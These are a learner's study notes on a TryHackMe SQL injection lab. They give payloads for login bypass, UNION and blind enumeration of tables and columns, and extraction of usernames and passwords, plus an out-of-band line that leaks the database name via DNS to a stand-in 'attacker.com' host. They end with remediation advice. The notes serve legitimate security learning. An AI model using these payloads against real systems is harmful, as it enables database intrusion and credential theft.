# THM SQL Injection — What I Learned

---

## 1. Room Overview

### Topics Covered
- In-band SQL Injection
- UNION-based SQL Injection
- Boolean Blind SQL Injection
- Time-Based Blind SQL Injection
- Out-of-Band SQL Injection
- SQL Injection Remediation

### Goal of the Room
This room teaches how attacker-controlled input can affect SQL queries and how different SQL injection techniques are used depending on the available output channel.

**The attacker's goal is to:**
- Understand how input reaches the database
- Confirm whether SQL logic can be changed
- Enumerate database structure
- Extract sensitive data (usernames, passwords)

---

## 2. Core Mental Models

### What is SQL Injection?

**SQL** = Structured Query Language (used to communicate with databases)

**Query** = instruction sent to DBMS to request, insert, update, or delete data

**SQL Injection** happens when attacker-controlled input is inserted into a SQL query in a way that allows the attacker to change the SQL logic.

**The core problem:** User input is treated as SQL code instead of data.

**Example:**
```sql
SELECT * FROM users WHERE username = '$input';
```

If the attacker inputs:
```sql
' OR 1=1 --
```

The query becomes:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --';
```

**The attacker has changed the query structure.**

---

### UNION-Based SQLi

**Used when:** The application displays database output on the page.

**UNION** allows the attacker to append another SELECT query to the original query.

**Example:**
```sql
UNION SELECT username,password FROM users
```

**IMPORTANT:** UNION only works if both SELECT statements return the **same number of columns**.

**Example:**
```sql
SELECT name,price FROM products
UNION
SELECT username,password FROM users;
```

Both queries return 2 columns, so the structure matches.

**The usual flow:**
1. Confirm injection
2. Check whether UNION works
3. Find column count
4. Find visible/reflected columns
5. Enumerate database name
6. Enumerate table names
7. Enumerate column names
8. Extract data

**Key takeaway:** UNION = direct output extraction

---

### Boolean Blind SQLi

**Used when:** The application does not directly show database output, but the page behaves differently depending on TRUE or FALSE conditions.

**The attacker asks yes/no questions.**

**Example:**
```sql
1 AND database() LIKE 's%' --
```

- If the page shows the product → condition is TRUE
- If the page shows no product → condition is FALSE

**Core idea:** No direct output → use response difference as signal

---

### Time-Based Blind SQLi

**Used when:** There is no visible response difference.

Instead of using page content as the signal, the attacker uses **response delay**.

**Example:**
```sql
1 AND IF(database() LIKE 's%', SLEEP(5), 0) --
```

**Meaning:**
- If database name starts with "s" → sleep for 5 seconds
- If false → no delay

**Core idea:** No visible difference → use time delay as signal

---

### Out-of-Band SQLi

**Used when:** The attacker cannot get useful output from the web response, boolean behavior, or timing.

Instead, the attacker forces the database to make an **external DNS or HTTP request** to a server they control.

**Example concept:**
```sql
LOAD_FILE(CONCAT('\\\\', database(), '.attacker.com\\test'))
```

If the database name is `sqli_four`, the database may try to resolve: sqli_four.attacker.com

The attacker checks their DNS/HTTP logs and sees the request.

**Core idea:** OOB SQLi = database leaks data through external network requests

**The output is NOT the webpage.**  
**The output is:** attacker-controlled DNS/HTTP logs

---

### Prepared Statements

**Prepared statements** prevent SQL injection by separating SQL structure from user input.

**Vulnerable query:**
```sql
SELECT * FROM users WHERE username = '$input';
```

**Prepared statement style:**
```sql
SELECT * FROM users WHERE username = ?;
```

The SQL structure is fixed first, and user input is treated **only as data**.

If the attacker inputs:
```sql
' OR 1=1 --
```

The database treats it as a **literal string**, not SQL logic.

**Core idea:** Prepared statements stop attacker input from changing SQL structure.

---

## 3. Attack Methodology / Flow

### Step 1 — Confirm SQL Injection

**Boolean tests:**
```sql
1 AND 1=1 --
1 AND 1=2 --
```

If the first payload returns normal output and the second changes the response, it means the input is affecting SQL logic.

**Example:**
- `1 AND 1=1` → Product shown
- `1 AND 1=2` → No product found

**This confirms SQL logic control.**

---

### Step 2 — Try Authentication Bypass

**Example:**
```sql
' OR 1=1 --
```

or, depending on syntax:
```sql
' OR 1=1;--
```

This attempts to force a login query to return TRUE.

**Important:**
- Login bypass ≠ SQLi confirmation
- A login bypass may fail even if SQLi exists (application may hide errors or apply extra logic)
- **A stronger confirmation method is TRUE/FALSE comparison**

---

### Step 3 — Test UNION and Column Count

If UNION is allowed, test column count:
```sql
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --
```

The working payload reveals how many columns the original query returns.

**Why NULL?**  
NULL is flexible and usually compatible with many column types.

---

### Step 4 — Find Reflected / Visible Columns

After finding column count, use marker values:
```sql
' UNION SELECT 1,2,3 --
```

If the page shows `2`, then column 2 is visible.

**The visible column is where useful data should be placed.**

**Example:**
```sql
' UNION SELECT NULL,database(),NULL --
```

---

### Step 5 — Find Database Name

**UNION method:**
```sql
' UNION SELECT NULL,database(),NULL --
```

**Boolean method:**
```sql
1 AND database() LIKE 'sql%' --
```

**Time-based method:**
```sql
1 AND IF(database() LIKE 'sql%', SLEEP(5), 0) --
```

---

### Step 6 — Find Table Names

**UNION method:**
```sql
' UNION SELECT NULL,group_concat(table_name),NULL
FROM information_schema.tables
WHERE table_schema='database_name' --
```

**Blind/time-based method:**
```sql
1 AND IF(
  (
    SELECT 1
    FROM information_schema.tables
    WHERE table_schema='database_name'
    AND table_name LIKE 'user%'
    LIMIT 1
  ),
  SLEEP(5),
  0
) --
```

**Explanation:**
- `SELECT 1` = return a simple value if a matching row exists
- `FROM information_schema.tables` = look at metadata storing table names
- `WHERE table_schema='database_name'` = only check that database
- `table_name LIKE 'user%'` = ask whether a table starts with "user"
- `LIMIT 1` = only return one row to avoid multi-row subquery problems
- `SLEEP(5)` = delay if TRUE

---

### Step 7 — Find Column Names

**UNION method:**
```sql
' UNION SELECT NULL,group_concat(column_name),NULL
FROM information_schema.columns
WHERE table_name='users' --
```

**Blind/time-based method:**
```sql
1 AND IF(
  (
    SELECT 1
    FROM information_schema.columns
    WHERE table_schema='database_name'
    AND table_name='users'
    AND column_name LIKE 'pass%'
    LIMIT 1
  ),
  SLEEP(5),
  0
) --
```

---

### Step 8 — Extract Data

**UNION method:**
```sql
' UNION SELECT NULL,group_concat(username,':',password SEPARATOR '<br>'),NULL
FROM users --
```

**Blind/time-based method:**
```sql
1 AND IF(
  (
    SELECT 1
    FROM database_name.users
    WHERE username LIKE 'admin'
    LIMIT 1
  ),
  SLEEP(5),
  0
) --
```

**To extract password:**
```sql
1 AND IF(
  (
    SELECT 1
    FROM database_name.users
    WHERE username='admin'
    AND password LIKE 'p%'
    LIMIT 1
  ),
  SLEEP(5),
  0
) --
```

---

## 4. Important Payload Patterns

### Boolean Confirmation
```sql
1 AND 1=1 --
1 AND 1=2 --
```

### UNION Column Count
```sql
UNION SELECT NULL --
UNION SELECT NULL,NULL --
UNION SELECT NULL,NULL,NULL --
```

### UNION Visible Column Test
```sql
UNION SELECT 1,2,3 --
```

### Database Name
```sql
database()
```

**Example:**
```sql
1 AND database() LIKE 'sql%' --
```

### Table Enumeration
```sql
SELECT 1
FROM information_schema.tables
WHERE table_schema='database_name'
AND table_name LIKE 'prefix%'
LIMIT 1
```

### Column Enumeration
```sql
SELECT 1
FROM information_schema.columns
WHERE table_schema='database_name'
AND table_name='users'
AND column_name LIKE 'prefix%'
LIMIT 1
```

### Time-Based IF Payload
```sql
1 AND IF(
  (
    SELECT 1
    FROM information_schema.tables
    WHERE table_schema='database_name'
    AND table_name LIKE 'prefix%'
    LIMIT 1
  ),
  SLEEP(5),
  0
) --
```

---

## 5. How to Save Time During Blind SQLi

### Inefficient Method

Brute-forcing prefixes randomly:
```sql
database() LIKE 'sqla%'
database() LIKE 'sqlb%'
database() LIKE 'sqlc%'
```

This works but is **slow**.

---

### Better Method 1 — LENGTH()

Find the length first:
```sql
1 AND LENGTH(database())=13 --
```

or time-based:
```sql
1 AND IF(LENGTH(database())=13, SLEEP(5), 0) --
```

---

### Better Method 2 — SUBSTRING()

Extract one character at a time:
```sql
1 AND SUBSTRING(database(),1,1)='s' --
1 AND SUBSTRING(database(),2,1)='q' --
1 AND SUBSTRING(database(),3,1)='l' --
```

**Time-based version:**
```sql
1 AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0) --
```

---

### Better Method 3 — ASCII Comparison

Use ASCII values to reduce guesses:
```sql
1 AND ASCII(SUBSTRING(database(),1,1)) > 109 --
```

**Time-based version:**
```sql
1 AND IF(ASCII(SUBSTRING(database(),1,1)) > 109, SLEEP(5), 0) --
```

**This allows binary search instead of guessing every character.**

---

## 6. Mistakes I Made

- I sometimes mixed SQL condition syntax with SQL query structure
- I tried to use `FROM information_schema.tables` directly after `AND`, which is invalid
- I forgot that querying table names or column names requires a **subquery**
- I brute-forced prefixes inefficiently instead of using `LENGTH()` and `SUBSTRING()`
- I made syntax mistakes with `SELECT`, `FROM`, `IF()`, and `LIMIT 1`
- I sometimes focused on payloads instead of asking: **"What question am I asking the database?"**
- I initially treated some payloads like memorized patterns instead of understanding SQL grammar deeply

---

## 7. Key Lessons Learned

- SQLi happens when attacker input becomes SQL logic
- **UNION SQLi** is for direct output extraction
- **Boolean Blind SQLi** is for TRUE/FALSE signal extraction
- **Time-Based SQLi** is for delay/no-delay signal extraction
- **OOB SQLi** uses external DNS/HTTP requests as the output channel
- Column count matters **only for UNION-based SQLi**
- `AND` modifies the `WHERE` condition; it does **not** add new output columns
- `information_schema` stores metadata such as table names and column names
- `SELECT 1` is used when we only care whether a matching row exists
- `LIMIT 1` prevents a subquery from returning multiple rows
- **Prepared statements** are the best defense because they separate SQL structure from user input

---

## 8. Remediation / Defense

### Prepared Statements

Prepared statements prevent SQLi by fixing the SQL query structure **before** user input is added.

User input is treated as **data**, not executable SQL logic.

### Input Validation

Input validation restricts what input is allowed.

**Example:** If `id` should be numeric, only allow numbers.

This reduces attack surface but should **not replace** prepared statements.

### Escaping

Escaping neutralizes special characters like quotes.

However, escaping is **weaker than prepared statements** because encoding, DB behavior, and developer mistakes can cause bypasses.

---

## 9. Final Reflection

This room helped me understand SQL injection beyond simple login bypass payloads. I learned how to reason through different SQLi situations depending on the **available output channel**.

**The biggest lesson:** SQLi is not about memorizing payloads. It is about understanding:
- Query structure
- Attacker-controlled input
- The signal available from the application

**My biggest weakness:** SQL syntax fluency under pressure, especially when using subqueries for blind/time-based extraction.

**My next focus:** Become faster and more precise with SQL payload structure, especially:
- `IF()`
- `SELECT 1`
- `information_schema`
- `LIMIT 1`
- `SUBSTRING()`
- `LENGTH()`
- `ASCII()`
